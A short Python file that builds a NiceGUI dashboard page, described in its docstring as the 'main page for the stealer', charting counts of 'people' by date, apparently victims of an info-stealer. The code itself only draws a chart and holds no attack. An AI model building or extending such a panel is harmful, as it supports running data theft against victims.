from nicegui import ui

from panel.ui.handlers.stats_handler import StatisticsHandler


async def fr_page() -> None:
    """Main page for the stealer. Very simple."""

    stat_handler = StatisticsHandler()

    data = await stat_handler.get_people()
    dates = [item[0] for item in data]
    values = [item[1] for item in data]

    ui.echart(
        {
            "xAxis": {"type": "category", "data": dates},
            "yAxis": {"type": "value"},
            "series": [{"type": "line", "data": values, "smooth": True}],
        }
    ).classes("m-4 w-full h-full")
